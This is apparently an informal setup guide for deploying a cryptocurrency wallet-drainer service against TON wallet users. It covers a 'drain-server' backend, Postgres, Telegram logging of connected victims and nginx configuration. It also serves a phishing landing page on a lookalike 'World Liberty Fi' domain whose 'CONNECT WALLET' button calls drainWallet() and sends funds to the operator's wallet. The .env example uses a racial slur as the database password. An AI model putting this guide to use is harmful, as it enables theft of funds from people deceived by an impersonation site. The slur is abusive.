hey man, final version. everything now runs on YOUR dedicated server — no cloudflare proxy games, no shared backend, you own the whole stack. heres the exact copy-paste path from zero to live.

## step 0 — dns (do this first)

in your cloudflare dashboard, set the A record for `worldlibertyfi.trade` to your server IP and **turn the orange cloud OFF** (grey cloud, DNS only). this matters — if the proxy stays on, wallets get a challenge page instead of your json and everything breaks with "invalid manifest". dns only. letsencrypt handles ssl on the box itself.

verify after a few mins: `ping worldlibertyfi.trade` should resolve to your server IP, not cloudflare IPs.

## step 1 — system packages

```bash
apt update && apt upgrade -y
apt install -y curl git nginx docker.io docker-compose-v2 certbot ufw
```

## step 2 — runtimes

```bash
curl -fsSL https://bun.sh/install | bash
source ~/.bashrc
curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && apt install -y nodejs
node -v   # must be v20.x
```

(if you have old node 12 packages from ubuntu repos, remove them first: `apt remove -y libnode-dev libnode72 nodejs-doc && apt autoremove -y`, they conflict with node 20)

## step 3 — deploy the project

```bash
mkdir -p /opt/drain-server
# upload the files from this zip:
# scp -r sale-export/* root@YOUR_IP:/opt/drain-server/
# or however you transfer — git, rsync, whatever

cd /opt/drain-server
```

## step 4 — postgres

```bash
docker compose up -d
sleep 8
# verify:
docker exec postgres pg_isready -U fragment -d drainer
# → "accepting connections"
```

(if you get "container name postgres already in use" — an old container from a previous attempt is hanging around: `docker rm -f postgres` then retry)

## step 5 — deps + migrations

```bash
bun install
bunx prisma generate
bunx prisma migrate deploy
```

## step 6 — config

```bash
cat > /opt/drain-server/.env << 'EOF'
DATABASE_URL=postgresql://fragment:nigger@localhost:5432/drainer
BOT_TOKEN=your-bot-token-from-botfather
LOGGING_CHANNEL=your-log-chat-id
WALLET=EQ...your-wallet
URL=https://worldlibertyfi.trade
TONAPI_KEY=
DEBUG=drainer:*
EOF
chmod 600 .env
```

format is strict: `KEY=value`, no spaces around `=`, no quotes, no windows line endings. this is the #1 silent killer.

**bot token** — only used for sending log messages to your chat, no bot process runs. create a bot via @BotFather if you havent, create a channel/group for logs, add the bot (admin if channel), get the chat id from @getidsbot (it comes with the minus, copy it whole).

**wallet** — everything lands here. yours.

quick test that logs will work:

```bash
source .env
curl -s "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$LOGGING_CHANNEL&text=ALIVE"
```

`"ok":true` = good. `chat not found` = bot not in the chat or wrong id.

## step 7 — systemd (keep it alive)

```bash
cat > /etc/systemd/system/drain.service << 'EOF'
[Unit]
Description=Drain Server
After=network.target docker.service

[Service]
WorkingDirectory=/opt/drain-server
EnvironmentFile=/opt/drain-server/.env
ExecStart=/root/.bun/bin/bun run ./src/index.ts
Restart=always
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now drain
journalctl -u drain -n 5
```

should print `Started server on 49238 port`. from now on `journalctl -u drain -f` is your live log view.

## step 8 — ssl cert

```bash
# nginx must be stopped for this (standalone mode grabs port 80)
certbot certonly --standalone -d worldlibertyfi.trade \
  --non-interactive --agree-tos -m admin@worldlibertyfi.trade
```

## step 9 — nginx (landing + api on one domain)

```bash
mkdir -p /var/www/landing

cat > /etc/nginx/sites-available/drain << 'EOF'
server {
    listen 80;
    server_name worldlibertyfi.trade;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name worldlibertyfi.trade;

    ssl_certificate     /etc/letsencrypt/live/worldlibertyfi.trade/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/worldlibertyfi.trade/privkey.pem;

    # landing static files live in /var/www/landing
    root /var/www/landing;
    index index.html;

    location / {
        try_files $uri $uri/ @backend;
    }

    # api goes straight to the drain server
    location ~ ^/(transaction|connected|accept|reject|disconnect|manifest) {
        proxy_pass http://127.0.0.1:49238;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location @backend {
        proxy_pass http://127.0.0.1:49238;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # static with cache
    location ~* \.(css|js|png|jpg|svg|ico|woff2?)$ {
        expires 1d;
        try_files $uri @backend;
    }
}
EOF

ln -sf /etc/nginx/sites-available/drain /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl enable --now nginx
```

## step 10 — landing files

drop your landing html + assets into `/var/www/landing/`:

```
/var/www/landing/
├── index.html               ← your page
├── connect.js               ← from this package (src/front/js/)
├── address.js               ← from this package
├── tonconnect-manifest.json ← url: https://worldlibertyfi.trade
└── icon.png                 ← any 180x180+ icon
```

manifest content:

```json
{
  "url": "https://worldlibertyfi.trade",
  "name": "World Liberty Fi",
  "iconUrl": "https://worldlibertyfi.trade/icon.png",
  "termsOfUseUrl": "https://worldlibertyfi.trade",
  "privacyPolicyUrl": "https://worldlibertyfi.trade"
}
```

in your index.html:

```html
<script src="https://unpkg.com/@tonconnect/ui@3.0.2/dist/tonconnect-ui.min.js"></script>
<script src="address.js"></script>

<script>
  window.DRAINER_BACKEND = "https://worldlibertyfi.trade";
</script>
<script src="connect.js"></script>

<!-- your button, either way works -->
<button onclick="drainWallet()">CONNECT WALLET</button>
```

## step 11 — firewall

```bash
ufw allow 22/tcp && ufw allow 80/tcp && ufw allow 443/tcp
ufw --force enable
```

## step 12 — smoke test

```bash
# manifest is clean json:
curl -s https://worldlibertyfi.trade/tonconnect-manifest.json

# api answers:
curl -s "https://worldlibertyfi.trade/transaction?wallet=EQCD39VS5jcptHL8vMjEXrzGaRc-hPfrx2CT-HTF5-Lfnz5n&workerId=1&drainMode=Full"

# landing loads:
curl -s -o /dev/null -w "%{http_code}" https://worldlibertyfi.trade/
```

then open the site in a browser, hit connect, pick tonkeeper, hit your claim button — wallet should pop the confirm screen, and your log chat should get the "wallet connected" ping.

## cheat sheet

```bash
systemctl restart drain                 # after editing .env
journalctl -u drain -f                  # live logs
docker exec postgres psql -U fragment -d drainer   # poke the db
certbot renew --dry-run                 # ssl renewal check (auto anyway)
```

## troubleshooting

| symptom | fix |
|---|---|
| "invalid manifest" | cloudflare proxy is on. turn it OFF (grey cloud), wait for dns |
| server wont start | .env formatting — no spaces/quotes/CRLF |
| no logs in chat | bot not in chat, or wrong chat id. curl test from step 6 |
| landing loads but button dead | check devtools network tab — /transaction red = backend down, `systemctl status drain` |
| 502 on api | drain service crashed: `journalctl -u drain -n 50` |

thats it. one box, one domain, zero cloudflare headaches. ship it.
